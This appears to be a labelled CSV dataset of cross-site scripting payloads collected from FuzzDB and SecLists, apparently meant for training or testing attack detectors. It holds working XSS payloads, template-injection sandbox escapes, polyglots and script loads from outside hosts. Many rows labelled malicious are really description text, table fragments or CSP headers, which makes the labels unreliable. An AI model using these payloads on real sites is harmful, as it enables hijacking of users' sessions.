Payload,Signature,AttackType,Severity,MITRE,Label,Description
res:// installed software probing,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
res://c:\\\\program%20files\\\\adobe\\\\acrobat%207.0\\\\acrobat\\\\acrobat.dll/#2/#210,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
s>};function f() { 0[this.x](this.y) }f.call(o);,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
script-src 'self' data:,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
setTimeout(location.search.slice(1));,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
setTimeout`alert\\u0028document.domain\\u0029`;,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
substr,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
toString().constructor.prototype;a.charAt=a.trim;,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"top[""al""+""ert""](1)",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
top['al\\145rt'](1),GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
top['al\\x65rt'](1),GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
top[/al/.source+/ert/.source](1),GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
top[8680439..toString(30)](1),GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
u1=s1+s2+s3;URL=u1,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
v3&callback=alert();,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
var _ = document.createElement(\\'script\\');,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
var _=document.createElement(\\\\'script\\\\');_.src=\\\\'//localhost/m\\\\';document.body.appendChild(_);,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
var _=document\\\\x2ecreateElement(\\'script\\');,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"var a = ""</script> <script> alert('XSS !'); </script> <script>"";",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"var data = ""jaVasCript:/*-/*`/*\\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\\x3e"";document.documentElement.innerHTML = data;",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"var data = ""jaVasCript:/*-/*`/*\\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\\x3e"";document.head.outerHTML = data;",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"var data = ""jaVasCript:/*-/*`/*\\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\\x3e"";document.write(data);document.close();",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"var str = ""jaVasCript:/*-/*`/*\\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"";",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"var str = 'jaVasCript:/*-/*`/*\\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e';",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
window.location,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
window.onerror=alert;throw%201),EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
with() executing alert via document.__parent__,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
wtf? Chrome,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
x='<%',GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"xmlns:svg=""http://www.w3.org/2000/svg"">",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
x”</title><img src%3dx onerror%3dalert(1)>,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
{{!ready && (ready = true) && (,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
{{$eval.constructor('alert(1)')()}},TEMPLATE_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
{{$on.constructor('alert(1)')()}},TEMPLATE_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"{{'a'.constructor.prototype.charAt=''.valueOf;$eval(""x='\\""+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\\""'"");}}",COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}},COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}},COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
{{0[a='constructor'][a]('alert(1)')()}},TEMPLATE_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
{{[].pop.constructor&#40'alert\\u00281\\u0029'&#41&#40&#41}},TEMPLATE_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
{{constructor.constructor('alert(1)')()}},TEMPLATE_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}},COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
| `\\u02B9` (%CA%B9)       | MODIFIER LETTER PRIME        | '     | APOSTROPHE     |,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
"| `\\u02BA` (%CA%BA)       | MODIFIER LETTER DOUBLE PRIME | ""     | QUOTATION MARK |",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
| `\\uFF1C` (%EF%BC%9C)    | FULLWIDTH LESS­THAN SIGN      | <     | LESS­THAN       |,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
| `\\uFF1E` (%EF%BC%9E)    | FULLWIDTH GREATER­THAN SIGN   | >     | GREATER­THAN    |,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
| `\\x1B $@` | JIS X 0208 1978 |,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
| `\\x1B $B` | JIS X 0208 1983 |,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
| `\\x1B (B` | ASCII           |,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
| `\\x1B (J` | JIS X 0201 1976 |,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
| `İ` (%c4%b0) | `toLowerCase()` | i |,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
| `ı` (%c4%b1) | `toUpperCase()` | I |,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
| `ſ` (%c5%bf) | `toUpperCase()` | S |,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
| `K` (%E2%84) | `toLowerCase()` | k |,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
javascript:alert('XSS'),GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
ʺ＞＜svg onload=alert(/XSS/)＞/,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
JSON based onload vector,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<div onpointermove=""alert(45)"">MOVE HERE</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"onerror CDATA ""alert(67)""",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Basic JS breaker variant 7,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<div id=""115""><!--[if]><script>alert(115)</script -->",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
ondatasetcomplete,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Self-contained XSS variant 2,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}},XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
OBJECT w/Embedded XSS,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<img src=x onerror=prompt('XSS')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onwebkitanimationiteration,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<--`<iMG/srC=` onerror=confirm``> --!>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
onfocus,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
'-alert(1)-',XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
onfinish,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
confirm('XSS'),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<svg xmlns=""http://www.w3.org/2000/svg"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<!-- Up to Opera 12.x -->,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<x ondblclick=alert(1)>double click this!,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
'alert(1);',XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"onload CDATA ""alert(2)"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
ondragdrop,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<textarea onfocus=alert('document.domain') autofocus>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<BODY BACKGROUND=""javascript:alert('XSS')"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
iframe Chrome bypass,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: HTML entities (the semicolons are required for this to work).,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"*/alert(1)"">'onload=""/*<svg/1='",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"""onmouseover=alert(1)//",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"""><script src=//brutelogic.com.br&sol;1.js&num;",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<div onkeydown=alert(""XSS"")>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
alert(cookieValue.value),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Remote IE URL overloading,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onformchange,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Escaping JavaScript escapes,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<img src='1' onerror\x0b=alert(0) />,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onloadedmetadata,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<p onclick=confirm(""XSS"")>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
ongesturechange,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"| `\u02BA` (%CA%BA)       | MODIFIER LETTER DOUBLE PRIME | ""     | QUOTATION MARK |",CMDi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onloadeddata,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<svgonload=alert(1)>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Cookie Manipulation,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
| `ſ` (%c5%bf) | `toUpperCase()` | S |,CMDi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
al\x65rt\x2814\x29,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<div id=""132""><!doctype html>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Author Name: DoctorDan,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Firefox Lookups 3,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onmouseleave,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<style>jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e</style>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"""><script>alert(""document.domain"")</script>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: Basic injection attack,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Obfuscated onload attribute variant 2,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<svg><script onlypossibleinopera:-)> alert(1),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<script>/*jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e*/</script>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
&#x00003c,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onafterupdate,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<audio src=x onerror=alert(""XSS"")>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: This vector uses urlencoded hex entities to obfuscate the javascript: image source.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Advanced HTML injection locator,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<audio src=x onerror=alert('1')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onbeforeunload,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
| `İ` (%c4%b0) | `toLowerCase()` | i |,CMDi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
alert\u0028document.domain\u0029,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<div id=""117""><a href=""http://attacker.org"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Exploit Description: This very basic exploit works on surprisingly many pages - no real danger but bad image.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<set attributeName=""xlink:href"" begin=""accessKey(c)"" to=""//example.com/?c"" />",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
onbeforeupdate,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onorientationchange,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Mixed Encoding,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<script src=""https://js.rip/<custom.name>""></script>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Basic JS breaker variant 5,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
